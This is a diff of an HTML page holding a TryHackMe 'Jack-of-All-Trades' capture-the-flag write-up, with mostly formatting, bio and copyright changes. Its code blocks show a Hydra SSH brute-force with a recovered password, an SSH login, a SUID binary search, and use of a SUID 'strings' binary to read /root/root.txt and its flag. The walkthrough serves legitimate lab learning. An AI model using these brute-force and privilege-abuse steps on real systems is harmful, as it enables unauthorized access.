@@ -2220,21 +2220,21 @@ Serving HTTP on 0.0.0.0 port <span class="m">8000</span> ...
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">hydra -l jack -P jacks_password_list ssh://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -s <span class="m">80</span>
-Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
-
-Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-01-05 13:25:01
-<span class="o">[</span>WARNING<span class="o">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="m">4</span>
-<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">24</span> login tries <span class="o">(</span>l:1/p:24<span class="o">)</span>, ~2 tries per task
-<span class="o">[</span>DATA<span class="o">]</span> attacking ssh://10.10.122.111:80/
-<span class="o">[</span>80<span class="o">][</span>ssh<span class="o">]</span> host: 10.10.122.111   login: jack   password: ITMJpGGIqg1jn?&gt;@
-<span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
-Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-01-05 13:25:06
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l jack -P jacks_password_list ssh://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -s <span class="m">80</span>
+</span></span><span class="line"><span class="cl">Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-01-05 13:25:01
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="m">4</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">24</span> login tries <span class="o">(</span>l:1/p:24<span class="o">)</span>, ~2 tries per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ssh://10.10.122.111:80/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>80<span class="o">][</span>ssh<span class="o">]</span> host: 10.10.122.111   login: jack   password: ITMJpGGIqg1jn?&gt;@
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-01-05 13:25:06
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2255,26 +2255,26 @@ Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span cl
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ssh jack@<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -p <span class="m">80</span>
-The authenticity of host <span class="s1">&#39;[10.10.122.111]:80 ([10.10.122.111]:80)&#39;</span> can<span class="s1">&#39;t be established.
-</span><span class="s1">ECDSA key fingerprint is SHA256:wABOsY4G6TIcuJ2bmAIpsoBGVR06p/QGP2J7tfiSy2s.
-</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-</span><span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>10.10.122.111<span class="o">]</span>:80<span class="s1">&#39; (ECDSA) to the list of known hosts.
-</span><span class="s1">jack@10.10.122.111&#39;</span>s password: 
-jack@jack-of-all-trades:~$ ls -la
-total <span class="m">312</span>
-drwxr-x--- <span class="m">3</span> jack jack   <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">3</span> root root   <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> ..
-lrwxrwxrwx <span class="m">1</span> root root      <span class="m">9</span> Feb <span class="m">29</span>  <span class="m">2020</span> .bash_history -&gt; /dev/null
--rw-r--r-- <span class="m">1</span> jack jack    <span class="m">220</span> Feb <span class="m">29</span>  <span class="m">2020</span> .bash_logout
--rw-r--r-- <span class="m">1</span> jack jack   <span class="m">3515</span> Feb <span class="m">29</span>  <span class="m">2020</span> .bashrc
-drwx------ <span class="m">2</span> jack jack   <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> .gnupg
--rw-r--r-- <span class="m">1</span> jack jack    <span class="m">675</span> Feb <span class="m">29</span>  <span class="m">2020</span> .profile
--rwxr-x--- <span class="m">1</span> jack jack <span class="m">293302</span> Feb <span class="m">28</span>  <span class="m">2020</span> user.jpg
-
-jack@jack-of-all-trades:~$ python -m SimpleHTTPServer <span class="m">3333</span>
-Serving HTTP on 0.0.0.0 port <span class="m">3333</span> ...
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh jack@<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -p <span class="m">80</span>
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;[10.10.122.111]:80 ([10.10.122.111]:80)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:wABOsY4G6TIcuJ2bmAIpsoBGVR06p/QGP2J7tfiSy2s.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>10.10.122.111<span class="o">]</span>:80<span class="s1">&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span class="line"><span class="cl"><span class="s1">jack@10.10.122.111&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">jack@jack-of-all-trades:~$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">312</span>
+</span></span><span class="line"><span class="cl">drwxr-x--- <span class="m">3</span> jack jack   <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root   <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root      <span class="m">9</span> Feb <span class="m">29</span>  <span class="m">2020</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> jack jack    <span class="m">220</span> Feb <span class="m">29</span>  <span class="m">2020</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> jack jack   <span class="m">3515</span> Feb <span class="m">29</span>  <span class="m">2020</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> jack jack   <span class="m">4096</span> Feb <span class="m">29</span>  <span class="m">2020</span> .gnupg
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> jack jack    <span class="m">675</span> Feb <span class="m">29</span>  <span class="m">2020</span> .profile
+</span></span><span class="line"><span class="cl">-rwxr-x--- <span class="m">1</span> jack jack <span class="m">293302</span> Feb <span class="m">28</span>  <span class="m">2020</span> user.jpg
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">jack@jack-of-all-trades:~$ python -m SimpleHTTPServer <span class="m">3333</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">3333</span> ...
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Once again start the pyhton server so we can view the <strong>user.jpg</strong> image.</p>
 <h3 id="user-flag">User Flag</h3>
@@ -2294,7 +2294,7 @@ Serving HTTP on 0.0.0.0 port <span class="m">3333</span> ...
 <p><em>SUID is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherit’s access permissions from the logged in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file owner’s permissions as well as owner UID and GID when executing a file/program/command.</em> (<a href="https://www.linuxnix.com/suid-set-suid-linuxunix/">https://www.linuxnix.com/suid-set-suid-linuxunix/</a>)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2313,29 +2313,29 @@ Serving HTTP on 0.0.0.0 port <span class="m">3333</span> ...
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">jack@jack-of-all-trades:~$ find / -perm /4000  2&gt; /dev/null
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/pt_chown
-/usr/bin/chsh
-/usr/bin/at
-/usr/bin/chfn
-/usr/bin/newgrp
-/usr/bin/strings
-/usr/bin/sudo
-/usr/bin/passwd
-/usr/bin/gpasswd
-/usr/bin/procmail
-/usr/sbin/exim4
-/bin/mount
-/bin/umount
-/bin/su
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jack@jack-of-all-trades:~$ find / -perm /4000  2&gt; /dev/null
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">/usr/lib/pt_chown
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/at
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/strings
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/procmail
+</span></span><span class="line"><span class="cl">/usr/sbin/exim4
+</span></span><span class="line"><span class="cl">/bin/mount
+</span></span><span class="line"><span class="cl">/bin/umount
+</span></span><span class="line"><span class="cl">/bin/su
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>And we are lucky because thanks to SUID permission for <strong>strings</strong> we are able to read the <strong>root.txt</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2345,15 +2345,15 @@ Serving HTTP on 0.0.0.0 port <span class="m">3333</span> ...
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">jack@jack-of-all-trades:~$ strings /root/root.txt
-ToDo:
-1.Get new penguin skin rug -- surely they won<span class="err">&#39;</span>t miss one or two of those blasted creatures?
-2.Make T-Rex model!
-3.Meet up with Johny <span class="k">for</span> a pint or two
-4.Move the body from the garage, maybe my old buddy Bill from the force can <span class="nb">help</span> me hide her?
-5.Remember to finish that contract <span class="k">for</span> Lisa.
-6.Delete this: securi-tay2020_<span class="o">{</span>6f125d32f38fb8ff9e720d2dbce2210a<span class="o">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jack@jack-of-all-trades:~$ strings /root/root.txt
+</span></span><span class="line"><span class="cl">ToDo:
+</span></span><span class="line"><span class="cl">1.Get new penguin skin rug -- surely they won<span class="err">&#39;</span>t miss one or two of those blasted creatures?
+</span></span><span class="line"><span class="cl">2.Make T-Rex model!
+</span></span><span class="line"><span class="cl">3.Meet up with Johny <span class="k">for</span> a pint or two
+</span></span><span class="line"><span class="cl">4.Move the body from the garage, maybe my old buddy Bill from the force can <span class="nb">help</span> me hide her?
+</span></span><span class="line"><span class="cl">5.Remember to finish that contract <span class="k">for</span> Lisa.
+</span></span><span class="line"><span class="cl">6.Delete this: securi-tay2020_<span class="o">{</span>6f125d32f38fb8ff9e720d2dbce2210a<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div>
     </article>
@@ -2545,29 +2545,6 @@ ToDo:
   
 </script>
     
-<div class="donation">
-  <div class="donation__message">
-    Share on
-  </div>
-  <div class="donation__icons">
-    
-    
-    
-      
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fjack-of-all-trades%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
-        </a>
-      
-    
-      
-        <a href="https://twitter.com/intent/tweet?text=Jack-of-All-Trades%20%5bTryHackMe%5d&url=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fjack-of-all-trades%2f&hashtags=enumeration%2cprivilege%20escalation%2csteganography%2ccommand%20injection%2cbrute%20force&via=" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
-        </a>
-      
-    
-  </div>
-</div>
-
 
     
     
@@ -2593,7 +2570,7 @@ ToDo:
     </div>
     <div class="whoami__desc">
       
-        Computer Science student interested in Penetration Testing, Cyber Defense, OSINT and Social Engineering
+        Cyber Security Analyst | Master&#39;s student of Computer Science
       
     </div>
     <div class="whoami__social">
@@ -2780,7 +2757,7 @@ ToDo:
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.9d61b979db5cc2a1ff3a5d410e881547a61b9d28bc23e811c49061d47df07ef3.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3800,7 +3777,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    ©2022, All Rights Reserved
+                    ©2023, All Rights Reserved
                 
             </p>
         
